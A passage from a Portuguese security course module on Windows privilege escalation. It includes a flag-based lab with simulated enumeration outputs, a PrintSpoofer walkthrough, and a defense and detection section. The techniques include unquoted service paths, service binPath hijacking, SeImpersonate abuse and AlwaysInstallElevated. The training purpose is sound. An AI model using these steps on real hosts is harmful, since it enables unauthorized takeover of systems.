+**Objetivo:** ao terminar, você terá (1) achado, entre vários serviços, o único unquoted service path realmente explorável; (2) achado o único serviço cujo DACL você pode reconfigurar; e (3) decidido, entre dois caminhos até SYSTEM, qual sobrevive quando o Print Spooler está desligado. Três flags, uma por missão. Cada flag está escondida em **base64** (que você viu na Trilha 3) na saída do vetor certo; decodificar a do vetor errado devolve um aviso, não a flag.
+
+### 5.1 Preparar o terreno (passo a passo)
+
+Abra o terminal do Ubuntu (WSL) e cole o bloco inteiro de uma vez. Ele cria, em `/tmp/privesc-win`, as mesmas saídas de enumeração para todo mundo — os "achados" de um host Windows comprometido com acesso de baixo privilégio:
+
+```bash
+ROOT=/tmp/privesc-win
+rm -rf "$ROOT"; mkdir -p "$ROOT"
+cd "$ROOT"
+
+# --- Missão 1: sc qc de quatro serviços (cada um com uma nota em base64) ---
+cat > m1-services.txt <<'EOF'
+[SC] QueryServiceConfig — host SRV-APP01 — coletado como webapp
+
+SERVICE_NAME: AppSync
+        BINARY_PATH_NAME   : C:\Program Files\App Sync\Agent\syncagent.exe --daemon
+        SERVICE_START_NAME : LocalSystem
+        ; note(base64)=RkxBR3t1bnF1b3RlZC1zZXJ2aWNlLXBhdGgtd2luc30=
+
+SERVICE_NAME: HealthMon
+        BINARY_PATH_NAME   : "C:\Program Files\Health Monitor\hmon.exe"
+        SERVICE_START_NAME : LocalSystem
+        ; note(base64)=ZGVjb3k6IHRoaXMgc2VydmljZSBwYXRoIGlzIHF1b3RlZCwgbm90IGEgdmVjdG9y
+
+SERVICE_NAME: TelemetrySvc
+        BINARY_PATH_NAME   : C:\Telemetry\telsvc.exe
+        SERVICE_START_NAME : LocalSystem
+        ; note(base64)=ZGVjb3k6IG5vIHNwYWNlcyBpbiB0aGlzIHBhdGgsIG5vdGhpbmcgdG8gc3BsaXQ=
+
+SERVICE_NAME: PrintAgent
+        BINARY_PATH_NAME   : C:\Program Files\Print Agent\pa.exe
+        SERVICE_START_NAME : LocalSystem
+        ; note(base64)=ZGVjb3k6IGJpbmFyeSBkaXIgaXMgcmVhZC1vbmx5IGZvciBVc2Vycw==
+EOF
+
+cat > m1-icacls.txt <<'EOF'
+icacls dos diretórios dos caminhos com espaço — host SRV-APP01
+
+C:\Program Files\App Sync\        BUILTIN\Users:(OI)(CI)(M)
+                                  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                  BUILTIN\Administrators:(OI)(CI)(F)
+
+C:\Program Files\Print Agent\     BUILTIN\Users:(OI)(CI)(RX)
+                                  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                  BUILTIN\Administrators:(OI)(CI)(F)
+EOF
+
+# --- Missão 2: accesschk de serviços (direitos do usuário webapp) ---
+cat > m2-accesschk.txt <<'EOF'
+accesschk.exe -uwcqv webapp * — host SRV-APP01
+
+RW BackupMonitor
+        SERVICE_QUERY_STATUS
+        SERVICE_CHANGE_CONFIG
+        ; note(base64)=RkxBR3tjaGFuZ2UtY29uZmlnLWVxdWFscy1zeXN0ZW19
+R  Spooler
+        SERVICE_QUERY_STATUS
+        ; note(base64)=ZGVjb3k6IHlvdSBvbmx5IGhhdmUgU0VSVklDRV9RVUVSWV9TVEFUVVMgaGVyZQ==
+R  UpdateAgent
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        ; note(base64)=ZGVjb3k6IHlvdSBvbmx5IGhhdmUgU0VSVklDRV9RVUVSWV9TVEFUVVMgaGVyZQ==
+R  WinDefend
+        SERVICE_QUERY_STATUS
+        ; note(base64)=ZGVjb3k6IHlvdSBvbmx5IGhhdmUgU0VSVklDRV9RVUVSWV9TVEFUVVMgaGVyZQ==
+EOF
+
+# --- Missão 3: whoami /priv e o dump do registro ---
+cat > m3-whoami-priv.txt <<'EOF'
+whoami /priv — host SRV-APP01 — webapp
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                 Description                               State
+============================== ========================================= ========
+SeChangeNotifyPrivilege        Bypass traverse checking                  Enabled
+SeImpersonatePrivilege         Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege        Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege  Increase a process working set            Disabled
+EOF
+
+cat > m3-reg-installer.txt <<'EOF'
+reg query do Windows Installer — host SRV-APP01
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+; servico de impressao neste host: Spooler = STOPPED/DISABLED
+; dois caminhos ate SYSTEM foram estagiados; cada um tem um token:
+;   caminho A (via SeImpersonate): token(base64)=ZGVjb3k6IHRoaXMgcGF0aCBuZWVkcyBhIGNvZXJjaW9uIHNlcnZpY2UgdGhhdCBpcyBkaXNhYmxlZA==
+;   caminho B (via Windows Installer): token(base64)=RkxBR3thbHdheXMtaW5zdGFsbC1lbGV2YXRlZC1uby1zcG9vbGVyfQ==
+EOF
+
+echo "Cenário pronto em $ROOT"; ls -1 "$ROOT"
+```
+
+Para decodificar uma nota, isole o valor depois de `base64=` e passe para o `base64 -d`. Por exemplo, para ver o que diz a nota de um serviço:
+
+```console
+$ grep 'note(base64)' m1-services.txt | head -1 | cut -d= -f2- | base64 -d; echo
+```
+
+### 5.2 Missão 1 — SYSTEM por um unquoted service path (guiada)
+
+Você está como `webapp`, uma conta de serviço sem privilégios interessantes, e quer o binário de serviço que o LocalSystem executa a seu favor. Comece lendo os caminhos:
+
+```console
+$ grep -A1 SERVICE_NAME m1-services.txt | grep -E 'SERVICE_NAME|BINARY'
+SERVICE_NAME: AppSync
+        BINARY_PATH_NAME   : C:\Program Files\App Sync\Agent\syncagent.exe --daemon
+SERVICE_NAME: HealthMon
+        BINARY_PATH_NAME   : "C:\Program Files\Health Monitor\hmon.exe"
+SERVICE_NAME: TelemetrySvc
+        BINARY_PATH_NAME   : C:\Telemetry\telsvc.exe
+SERVICE_NAME: PrintAgent
+        BINARY_PATH_NAME   : C:\Program Files\Print Agent\pa.exe
+```
+
+`HealthMon` está entre aspas (imune). `TelemetrySvc` não tem espaço (não há onde cortar). Sobram **dois** candidatos com espaço e sem aspas: `AppSync` e `PrintAgent`. Qual é explorável? Só o que passar por um diretório **gravável por você**. É aí que entra o `m1-icacls.txt`. Seu objetivo: decidir qual dos dois e decodificar a nota dele — essa nota é a flag.
+
+<Hint title="Dica 1">
+No `m1-icacls.txt`, compare o direito do grupo `BUILTIN\Users` em cada diretório. `(M)` é *Modify* (pode gravar); `(RX)` é só *Read & Execute*. Para plantar um `.exe`, você precisa do `(M)`.
+</Hint>
+
+<Hint title="Dica 2">
+O serviço cujo diretório de caminho tem `Users:(M)` é o vetor. Pegue a `note(base64)` **desse** serviço no `m1-services.txt` e passe para `base64 -d`. A do outro candidato vai decodificar para um texto que começa com `decoy:` e explica por que ele não serve.
+</Hint>
+
+<Solution title="Solução">
+O `icacls` mostra `C:\Program Files\App Sync\` com `BUILTIN\Users:(OI)(CI)(M)` — gravável — e `C:\Program Files\Print Agent\` com `(RX)` — só leitura. Logo o vetor é o **AppSync**: você plantaria `C:\Program Files\App Sync\Agent.exe`, que o Windows executaria antes do `...\Agent\syncagent.exe`, como LocalSystem. Decodifique a nota do AppSync:
+
+```console
+$ awk '/SERVICE_NAME: AppSync/{f=1} f&&/note/{print;exit}' m1-services.txt | cut -d= -f2- | base64 -d; echo
+```
+
+A saída é a flag — mande no cartão. (Se você tivesse decodificado a nota do `PrintAgent`, teria recebido `decoy: binary dir is read-only for Users`, o próprio aviso de que o diretório dele não é gravável.) **Lição:** `sc qc` sozinho não basta; o unquoted path só vira vetor cruzado com um diretório gravável no `icacls`.
+</Solution>
+
+<FlagInput task="missao-1-unquoted" />
+
+### 5.3 Missão 2 — SYSTEM por um DACL de serviço fraco (desafio)
+
+Agora o `m2-accesschk.txt`: a saída do `accesschk` com os serviços sobre os quais o `webapp` tem algum direito. Quatro serviços aparecem. **Só um** te dá o poder de reconfigurar o que ele executa. Ache-o e decodifique a nota dele.
+
+<Hint title="Dica 1">
+Ler a config (`SERVICE_QUERY_STATUS`, `SERVICE_QUERY_CONFIG`) não muda nada. O que vira vetor é `SERVICE_CHANGE_CONFIG` (ou `SERVICE_ALL_ACCESS`): o direito de reescrever o `binPath`. Procure o serviço que tem essa linha.
+</Hint>
+
+<Solution title="Solução">
+Só o `BackupMonitor` lista `SERVICE_CHANGE_CONFIG`. Os outros três têm apenas direitos de leitura. Com ele, você faria `sc config BackupMonitor binPath= "..."` e `sc start BackupMonitor` para rodar seu comando como a conta do serviço. Decodifique a nota do BackupMonitor:
+
+```console
+$ awk '/BackupMonitor/{f=1} f&&/note/{print;exit}' m2-accesschk.txt | cut -d= -f2- | base64 -d; echo
+```
+
+É a flag. (As notas dos outros decodificam para `decoy: you only have SERVICE_QUERY_STATUS here`.) **Lição:** o rótulo `RW` do accesschk chama a atenção, mas o que importa é o direito listado embaixo — `CHANGE_CONFIG` é o que escala.
+</Solution>
+
+<FlagInput task="missao-2-change-config" />
+
+### 5.4 Missão 3 — O caminho que sobra sem o Spooler (desafio)
+
+O `m3-whoami-priv.txt` e o `m3-reg-installer.txt` descrevem um host com **dois** caminhos até SYSTEM: a conta tem `SeImpersonatePrivilege` (caminho A, estilo PrintSpoofer) **e** o `AlwaysInstallElevated` está ligado (caminho B, via `.msi`). Mas há uma pegadinha no ambiente. Seu objetivo: decidir qual caminho funciona **neste** host e decodificar o token certo.
+
+<Hint title="Dica 1">
+Releia os comentários do `m3-reg-installer.txt`. Qual é o estado do serviço `Spooler` aqui? O caminho A (SeImpersonate) precisa provocar um serviço SYSTEM a se conectar ao seu pipe — e o PrintSpoofer usa justamente o Spooler.
+</Hint>
+
+<Hint title="Dica 2">
+Confirme as duas condições do caminho B: as chaves `AlwaysInstallElevated` em HKLM **e** HKCU precisam estar em `0x1`. Se as duas estão, o caminho B (um `msiexec`) não depende de serviço nenhum. Decodifique o token do caminho B.
+</Hint>
+
+<Solution title="Solução">
+O Spooler está `STOPPED/DISABLED`, então o caminho A (PrintSpoofer) não tem o serviço de coerção de que precisa — o token A decodifica para `decoy: this path needs a coercion service that is disabled`. Já o caminho B tem as duas chaves em `0x1`, então um `.msi` instalado por você roda como SYSTEM sem depender de serviço algum. Decodifique o token B:
+
+```console
+$ grep 'caminho B' m3-reg-installer.txt | cut -d= -f2- | base64 -d; echo
+```
+
+É a flag. **Lição:** vetores não são universais. O PrintSpoofer é ótimo, mas depende de um serviço de coerção disponível; quando ele falta, outro achado (aqui, o AlwaysInstallElevated) é que leva a SYSTEM. Enumerar vários caminhos é o que te dá alternativa.
+</Solution>
+
+<FlagInput task="missao-3-sem-spooler" />
+
+### 5.5 Walkthrough de leitura — o PrintSpoofer num host de verdade
+
+Como você não tem um Windows aqui, segue o que a Missão 3 *teria* feito se o Spooler estivesse ligado — para você reconhecer a sequência num engajamento real. (É leitura; não há flag.)
+
+<Solution title="Ver o caminho A completo (PrintSpoofer)">
+A partir de uma web shell na conta do pool do IIS:
+
+```console
+C:\inetpub\wwwroot> whoami /priv | findstr /i impersonate
+SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
+
+C:\inetpub\wwwroot> PrintSpoofer.exe -i -c "cmd /c whoami"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+nt authority\system
+```
+
+Os cinco passos do diagrama da seção 3.2 acontecem dentro daquele único comando: criar o pipe, provocar o Spooler, recebê-lo como cliente SYSTEM, personificar o token e lançar o processo. Em hosts sem Spooler, as primas RoguePotato e GodPotato fazem o mesmo por outros serviços de coerção.
+</Solution>
+
+## 6. Variações e aprofundamento
+
+- **A família potato além do PrintSpoofer.** O **RoguePotato** (2020) funciona quando o PrintSpoofer não serve, redirecionando o resolvedor OXID do COM por um servidor na porta 135. O **GodPotato** (2023) cobre uma faixa ampla de versões (Windows 8 a 11, Server 2012–2022) abusando do DCOM. A escolha depende de qual serviço de coerção está disponível no alvo — por isso a enumeração do 6.4 lista quais privilégios e serviços existem.
+- **DLL hijacking de serviço.** Se um serviço LocalSystem carrega uma DLL por nome (sem caminho absoluto) e um diretório da busca é gravável, você planta a DLL e o SYSTEM a carrega — a versão Windows do mesmo princípio de "o privilegiado carrega algo que você controla".
+- **Contas de serviço gerenciadas (gMSA) e virtuais.** A defesa moderna troca o LocalSystem por contas virtuais e gMSA (group Managed Service Accounts), com privilégios mínimos — reduzindo o estrago quando um serviço é subvertido. Reconhecer `SERVICE_START_NAME` diferente de `LocalSystem` muda a sua expectativa de ganho.
+- **Encadeamento com o 6.4 e o 6.6.** Na prática, você chega aqui com o resultado do WinPEAS do 6.4 na mão; este módulo é o "e agora, qual eu uso". O 6.6 vai fechar o ciclo encadeando acesso inicial → enumeração → escalação num alvo só.
+
+## 7. Erros comuns
+
+- **`sc config` sem o espaço depois de `binPath=`.** O formato é `binPath= "..."` (espaço depois do `=`). Sem ele, o `sc` não entende o valor e a config não muda.
+- **O serviço não reinicia.** Se o `START_TYPE` é `DISABLED`, `sc start` falha com `(1058)`. Mude o start type (`sc config ... start= demand`) se tiver direito, ou espere um reinício. Alguns serviços críticos reiniciam sozinhos.
+- **PrintSpoofer não acha o Spooler.** Em hosts com o Print Spooler desligado (comum depois do PrintNightmare), use RoguePotato/GodPotato, que não dependem dele.
+- **`AlwaysInstallElevated` só numa chave.** Se só HKLM **ou** só HKCU está em `0x1`, o `.msi` roda com o seu privilégio normal e não escala. Confira as duas sempre.
+- **Arquitetura errada do binário/MSI.** Um payload de 32 bits numa pilha de serviço de 64 bits (ou vice-versa) pode não carregar. Gere o payload na arquitetura do alvo.
+- **Esquecer de limpar.** Reconfigurar um serviço e não restaurar o `binPath` original deixa o serviço quebrado (e um rastro gritante). Num engajamento, anote o valor original e reverta.
+
+## 8. Defesa e mitigação
+
+A boa notícia da escalação por configuração é que ela se **fecha por configuração** — não depende de patch (exceto os casos de CVE). Para cada família:
+
+**Serviços.**
+
+- **Privilégio mínimo da conta.** Não rode serviços como LocalSystem por padrão. Use contas virtuais (`NT SERVICE\<serviço>`) ou gMSA, com só os direitos de que o serviço precisa. Um serviço subvertido que roda como conta virtual não é SYSTEM.
+- **Aperte o DACL do serviço.** Usuários comuns não devem ter `SERVICE_CHANGE_CONFIG` nem `WRITE_DAC`. Audite com `accesschk.exe -uwcqv "Authenticated Users" *` (a mesma ferramenta do ataque, usada para defender) e corrija com `sc sdset`.
+- **Aspas no ImagePath.** Todo caminho de serviço com espaços deve estar entre aspas. Audite com um laço em PowerShell sobre `Get-CimInstance Win32_Service` procurando `PathName` com espaço e sem aspas.
+- **Permissões firmes nos binários e pastas de serviço.** `Program Files` é protegido por padrão; o perigo são instaladores de terceiros que afrouxam o DACL. Confira com `icacls` que só `SYSTEM`/`Administrators` têm escrita.
+
+**Tokens.**
+
+- **Remova `SeImpersonatePrivilege` de quem não precisa.** Ele é necessário a serviços como IIS e SQL Server, mas raramente a contas interativas. Trate toda conta com esse privilégio como quase-SYSTEM e isole-a.
+- **Desligue o Print Spooler onde não imprime** (servidores), fechando o vetor de coerção mais comum.
+- **Proteja o LSASS** (contra o abuso de `SeDebugPrivilege`): LSA Protection (RunAsPPL) e Credential Guard dificultam a leitura de credenciais da memória.
+
+**Permissões de arquivo/registro.**
+
+- **Desligue o AlwaysInstallElevated** por Group Policy (deixe as duas chaves em `0`); quase nunca há motivo legítimo para ligá-lo.
+- **Patch do HiveNightmare** (CVE-2021-36934) e remoção das shadow copies vulneráveis, como a Microsoft orientou. De forma geral, trate o DACL de arquivos sensíveis (hives, scripts de tarefas, chaves `Run`) como controle de segurança de primeira linha.
+- **LAPS** (Local Administrator Password Solution) para que a senha do administrador local seja única por máquina — se um host cair, o hash local não abre os outros.
+
+**Detecção.** Mudança de config de serviço gera o evento **7045** (serviço novo) e **4697** (serviço instalado); um `binPath` que vira `cmd`/`powershell` é alarme imediato. Processos SYSTEM nascidos de uma conta de serviço (um `cmd.exe` filho do `w3wp.exe` do IIS) são a assinatura clássica dos potato. Um EDR e o Sysmon (evento 1, criação de processo) pegam esses padrões.
+
+```text
+# Regra mental de triagem (defensor), sobre a saída do accesschk:
+#   Users / Authenticated Users com SERVICE_CHANGE_CONFIG  -> CRÍTICO
+#   ImagePath com espaço e sem aspas                        -> corrigir
+#   SeImpersonatePrivilege em conta interativa              -> investigar
+#   AlwaysInstallElevated = 1 (as duas chaves)              -> desligar já
+```
+
+## 9. Exercícios
+
+As três flags da seção 5 são a parte prática: Missão 1 (unquoted service path), Missão 2 (DACL de serviço fraco) e Missão 3 (o caminho que sobra sem o Spooler). Faça-as no seu WSL. Depois, responda ao quiz — ele cobra o *porquê* de cada vetor, não a decoreba dos comandos.
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- A identidade no Windows é o **token**: SID, grupos, privilégios e integrity level. Escalar é, no fundo, obter um token de SYSTEM.
+- **Serviços:** o SCM executa o que você mandar se você puder reconfigurar o serviço, trocar o binário ou plantar um `.exe` num unquoted path com diretório gravável — tudo vira LocalSystem.
+- **Tokens:** `SeImpersonatePrivilege` (PrintSpoofer/potato) é quase-SYSTEM; `SeBackupPrivilege` lê o SAM; `SeDebugPrivilege` rouba token do LSASS.
+- **Permissões:** `AlwaysInstallElevated` (as duas chaves) roda um `.msi` como SYSTEM; um DACL errado em arquivo/registro que o SYSTEM confia é vetor — foi o que o HiveNightmare explorou.
+- A priorização é a mesma do Linux (6.1/6.2): primeiro o confiável e silencioso (config errada), o kernel exploit por último.
+- A defesa é quase toda **configuração**: privilégio mínimo da conta de serviço, DACLs firmes, aspas no ImagePath, `SeImpersonate` só onde precisa, AlwaysInstallElevated desligado.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [PrintSpoofer – Abusing Impersonation Privileges on Windows 10 and Server 2019 (itm4n)](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) — a pesquisa original do abuso de SeImpersonatePrivilege.
+- [CVE-2021-36934 — Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934) — o boletim oficial do HiveNightmare.
+- [Access tokens (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens) — a documentação oficial do modelo de token do Windows.
+- [LOLBAS](https://lolbas-project.github.io/) — catálogo dos binários legítimos do Windows subvertíveis, o lado living-off-the-land da escalação.
